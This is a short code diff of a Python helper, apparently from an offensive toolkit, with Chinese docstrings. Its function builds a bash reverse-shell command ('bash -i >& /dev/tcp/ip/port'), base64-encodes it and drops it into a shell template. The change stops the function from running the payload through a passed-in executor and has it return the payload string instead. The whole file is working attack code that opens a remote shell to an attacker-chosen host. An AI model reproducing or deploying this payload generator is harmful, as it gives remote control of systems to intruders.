@@ -7,21 +7,16 @@ Created on 2020年5月22日
 import base64
 
 
-def base64_bash_reverse_shell(self, ip, port, exec_cmd_function):
+def base64_bash_reverse_shell(self, ip, port):
     """
     .反弹shell
     para:
-        ip:
+        ip:反弹shell接收ip
             type:str
-            describe:反弹shell接收ip
-        port:
+        port:反弹shell接收端口
             type:str
-            describe:反弹shell接收端口
-        exec_cmd_function:
-            type:function
-            describe:发送shell指令的函数
     return:
-        None
+        shell_message
     exception:
         None
     """
@@ -29,5 +24,5 @@ def base64_bash_reverse_shell(self, ip, port, exec_cmd_function):
     cmd = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip, port=port)
     cmd = base64.b64encode(cmd.encode()).decode()
     shell = shell.replace('SHELL', cmd)
-    html = exec_cmd_function(shell)
-    return html
+    return shell
+
